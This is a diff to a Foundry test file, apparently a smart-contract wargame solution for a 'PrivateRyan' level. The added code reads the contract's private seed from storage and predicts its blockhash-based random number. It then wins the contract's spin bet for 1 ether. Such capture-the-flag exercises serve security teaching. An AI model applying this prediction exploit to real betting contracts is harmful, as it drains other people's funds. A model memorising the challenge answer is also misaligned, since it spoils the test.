@@ -15,9 +15,20 @@ contract PrivateRyanTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint256 seed = uint256(vm.load(address(instance), bytes32(uint256(0))));
 
-        checkSuccess();
+        uint256 blockNumberMinusSeed = block.number - seed;
+
+        bytes32 hash = blockhash(blockNumberMinusSeed);
+        require(hash != bytes32(0), "blockhash returned zero, cannot proceed");
+        uint256 CONST_FACTOR = 1157920892373161954135709850086879078532699843656405640394575840079131296399;
+        uint256 nonConstFactor = (CONST_FACTOR * 100) / 100; // Since max=100
+        uint256 num = (uint256(hash) / nonConstFactor) % 100;
+
+        // Call the spin function with the predicted 'num' as our bet
+        instance.spin{value: 1 ether}(num);
+
+    checkSuccess();
     }
 
     function checkSuccess() internal view override {
